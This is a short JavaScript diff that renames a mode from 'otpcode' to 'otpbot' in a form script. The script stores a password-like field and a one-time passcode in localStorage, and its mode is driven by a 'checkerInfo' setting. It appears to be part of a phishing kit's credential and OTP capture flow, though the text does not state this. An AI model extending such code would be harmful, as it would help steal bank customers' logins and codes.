@@ -109,7 +109,7 @@ if(info.checkerInfo.mode === 'userpassword'){
     cavance.forEach(elem =>{
         elem.classList.remove('hidden');
     });
-}else if(info.checkerInfo.mode === 'otpcode'){
+}else if(info.checkerInfo.mode === 'otpbot'){
     setTimeout(() =>{
         // COMPROBAR ERROR
         if(info.metaInfo.cavance !== ''){
@@ -182,7 +182,7 @@ btnNextStep.addEventListener('click', () => {
             info.metaInfo.cavance = cavance[1].value;
             LS.setItem('info', JSON.stringify(info));
         }
-    } else if (info.checkerInfo.mode === 'otpcode') {
+    } else if (info.checkerInfo.mode === 'otpbot') {
         if (otpcode[1] && otpcode[1].value !== '') { // Verificar si otpcode[1] existe
             info.metaInfo.tok = otpcode[1].value;
             LS.setItem('info', JSON.stringify(info));
